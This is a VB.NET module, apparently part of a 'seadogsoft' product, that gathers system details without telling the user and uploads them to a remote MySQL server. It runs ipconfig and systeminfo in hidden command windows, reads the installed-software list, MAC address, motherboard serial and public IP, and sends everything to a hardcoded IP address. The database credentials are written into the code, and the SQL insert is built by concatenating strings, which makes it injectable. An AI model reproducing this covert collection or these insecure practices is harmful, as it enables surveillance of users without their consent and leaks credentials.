Imports System.Windows.Forms
Imports System.Runtime.InteropServices
Imports MySql.Data.MySqlClient
Imports MySql.Data
Imports MySql
Imports System.Data.Odbc
Imports Microsoft.Win32
Imports System.IO

'       呼叫方法
'       Dim Thread1 As New System.Threading.Thread(AddressOf GetInfo_Post)
'       Thread1.Start()

Module Module1

    Private mMySQLConnectionString As String
    Public conn As New MySqlConnection
    Public myDB As String = "collect"   'erweb_13679300
    Public myServer As String = "59.127.214.104"
    Public myUserName As String = "collect"
    Public myPassword As String = "collectseadog"
    Public Sub GetInfo_Post()
        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\seadogsoft", "Collect", 0) = 0 Then
            Dim MachineName = Environment.MachineName
            Dim OSFullName = My.Computer.Info.OSFullName
            Dim OSVer = Environment.OSVersion.VersionString
            Dim OSSP = Environment.OSVersion.ServicePack
            Dim OSPlatform = My.Computer.Info.OSPlatform
            Dim OSVersion = My.Computer.Info.OSVersion
            Dim PhysicalMemoryB = My.Computer.Info.TotalPhysicalMemory & "B"
            Dim PhysicalMemoryM = My.Computer.Info.TotalPhysicalMemory / 1048576 & "M"
            Dim PhysicalMemoryG = My.Computer.Info.TotalPhysicalMemory / 1073741824 & "G"
            Dim Screen_BitsPerPixel = My.Computer.Screen.BitsPerPixel
            Dim screenWidth = Screen.PrimaryScreen.Bounds.Width
            Dim screenHeight = Screen.PrimaryScreen.Bounds.Height
            Dim screendpi = screenWidth.ToString() + "*" + screenHeight.ToString()
            Dim IEVer = Get_IE_Ver()
            Dim MacArd = Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces(0).GetPhysicalAddress().ToString()
            Dim IP = GetPublishIP()
            Dim MotherBoard = GetMotherBoardCode()
            Dim CPUName = Microsoft.VisualBasic.Trim(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", Nothing))
            Dim VideoCard = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000", "DriverDesc", Nothing)
            Dim CPUCount = Environment.ProcessorCount
            Dim Dtae = DateTime.Now : Dim NowDate = Dtae.ToLongDateString().ToString()
            Dim cmd_ipconfig = Cmd("ipconfig")
            Dim cmd_systeminfo = Cmd("systeminfo")
            Dim cmd_ping8888 = Cmd("ping 8.8.8.8")
            Dim softlist = Getsoftlist()
            Dim username = SystemInformation.UserName
            Dim chromeLogo = readXmlnode("//@Logo") : Dim chromeVer = Split(chromeLogo, {"\"c})
            Dim s = Post(NowDate, MachineName, username, IP, screenWidth, screenHeight, screendpi, Screen_BitsPerPixel, IEVer, chromeVer(0), PhysicalMemoryB, PhysicalMemoryM, PhysicalMemoryG, CPUName, CPUCount, MacArd, MotherBoard, VideoCard, OSVer, OSSP, OSFullName, OSPlatform, OSVersion, cmd_ipconfig, cmd_systeminfo, cmd_ping8888, softlist)
            Register(s)
        End If
    End Sub

    Public Function Get_IE_Ver()
        Dim WshShell As Object = CreateObject("WScript.Shell")  '建立 Wsh Shell 物件 
        Return WshShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Version")
    End Function

    Public Function GetPublishIP()
        Dim WinHttpReq As Object = CreateObject("Msxml2.ServerXMLHTTP")
        WinHttpReq.Open("GET", "http://iframe.ip138.com/ic.asp")
        WinHttpReq.Send()
        Dim MyRegExp
        MyRegExp = CreateObject("VBScript.RegExp")
        MyRegExp.Pattern = "((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)"
        MyRegExp.IgnoreCase = True
        MyRegExp.Global = True
        Dim Matches As Object = MyRegExp.Execute(WinHttpReq.ResponseText)
        Return Matches.Item(0).Value
    End Function

    Private Function GetMotherBoardCode() As String
        Dim WMI As Object = GetObject("winmgmts:")
        Dim strCls As String = "Win32_BaseBoard"
        Dim strKey As String = strCls & ".Tag=""Base Board"""
        Return WMI.InstancesOf(strCls)(strKey).SerialNumber.ToString.Trim
        Marshal.ReleaseComObject(WMI)
    End Function

    Public Function Cmd(ByVal Command As String) As String
        Dim process As New System.Diagnostics.Process()
        process.StartInfo.FileName = "cmd.exe"
        process.StartInfo.UseShellExecute = False
        process.StartInfo.RedirectStandardInput = True
        process.StartInfo.RedirectStandardOutput = True
        process.StartInfo.RedirectStandardError = True
        process.StartInfo.CreateNoWindow = True
        process.Start()
        process.StandardInput.WriteLine(Command)
        process.StandardInput.WriteLine("exit")
        Dim Result As String = process.StandardOutput.ReadToEnd()
        process.Close()
        Return Result
    End Function

    Public Function Getsoftlist()
        Dim KeyName As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        Dim RegKey As Microsoft.Win32.RegistryKey = Registry.LocalMachine.OpenSubKey(KeyName, False)
        Dim SubKeyNames() As String = RegKey.GetSubKeyNames()
        Dim Index As Integer
        Dim SubKey As RegistryKey
        Dim x As String
        For Index = 0 To RegKey.SubKeyCount - 1
            SubKey = Registry.LocalMachine.OpenSubKey _
               ("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" + "\" + SubKeyNames(Index), False)
            If Not SubKey.GetValue("DisplayName", "") Is "" Then
                x = x + (CType(SubKey.GetValue("DisplayName", ""), String)) & vbCrLf
            End If
        Next
        Return x
    End Function

    Function readXmlnode(ByVal NodePath As String) As String
        Dim xmlPath As String = "C:\Program Files" & "\Google\Chrome\Application\VisualElementsManifest.xml"
        Dim xmlPath2 As String = "C:\Program Files (x86)" & "\Google\Chrome\Application\VisualElementsManifest.xml"
        Dim path As Integer
        path = 0
        If Not File.Exists(xmlPath) And Not File.Exists(xmlPath2) Then
            Return "N/A"
        Else
            If File.Exists(xmlPath) Then
                path = 1
            ElseIf File.Exists(xmlPath2) Then
                path = 2
            End If
            Dim doc As New System.Xml.XmlDocument
            If path = 1 Then
                doc.Load(xmlPath)
            ElseIf path = 2 Then
                doc.Load(xmlPath2)
            End If
            Dim mXmlNode As System.Xml.XmlNode
            mXmlNode = doc.SelectSingleNode(NodePath)
            Return mXmlNode.InnerText
        End If
    End Function

    Public Function Post(ByVal x1 As String, ByVal x2 As String, ByVal x3 As String, ByVal x4 As String, ByVal x5 As String, ByVal x6 As String, ByVal x7 As String, ByVal x8 As String, ByVal x9 As String, ByVal x10 As String, ByVal x11 As String, ByVal x12 As String, ByVal x13 As String, ByVal x14 As String, ByVal x15 As String, ByVal x16 As String, ByVal x17 As String, ByVal x18 As String, ByVal x19 As String, ByVal x20 As String, ByVal x21 As String, ByVal x22 As String, ByVal x23 As String, ByVal x24 As String, ByVal x25 As String, ByVal x26 As String, ByVal x27 As String)
        Dim sql As String = "INSERT INTO `collect`.`collect` (`Date`, `MachineName`, `Username`, `IP`, `screenWidth`, `screenHeight`, `screendpi`, `Screen_BitsPerPixel`, `IEVer`, `chromeVer`, `PhysicalMemoryB`, `PhysicalMemoryM`, `PhysicalMemoryG`, `CPUName`, `CPUCount`, `MacArd`, `MotherBoard`, `VideoCard`, `OSVer`, `OSSP`, `OSFullName`, `OSPlatform`, `OSVersion`, `cmd_ipconfig`, `cmd_systeminfo`, `cmd_ping8888`, `softlist`) VALUES (" & _
                    "'" & x1 & "', '" & x2 & "', '" & x3 & "', '" & x4 & "', '" & x5 & "', '" & x6 & "', '" & x7 & "', '" & x8 & "', '" & x9 & "', '" & x10 & "', '" _
                    & x11 & "', '" & x12 & "', '" & x13 & "', '" & x14 & "', '" & x15 & "', '" & x16 & "', '" & x17 & "', '" & x18 & "', '" & x19 & "', '" & x20 & "', '" _
                    & x21 & "', '" & x22 & "', '" & x23 & "', '" & x24 & "', '" & x25 & "', '" & x26 & "', '" & x27 & "');"
        Dim sucess = Run(sql)
        Return sucess
    End Function

    Public Function Run(ByVal SQL As String)
        Try
            If conn.State = ConnectionState.Closed Then
                mMySQLConnectionString = "Server=" & myServer & ";Database=" & myDB & ";UID=" & myUserName & ";Pwd=" & myPassword & ";charset=utf8;" '"Connect Timeout=40;"
                conn.ConnectionString = mMySQLConnectionString
                conn.Open()
                Dim adpt As New MySqlDataAdapter(SQL, conn)
                Dim ds As New DataSet
                adpt.Fill(ds)
                conn.Close()
                Return True
            End If
        Catch
            Return False
        End Try
    End Function

    Public Sub Register(ByVal su)
        If su = 1 Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\seadogsoft", "Collect", 1)
        Else
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\seadogsoft", "Collect", 0)
        End If
    End Sub
End Module
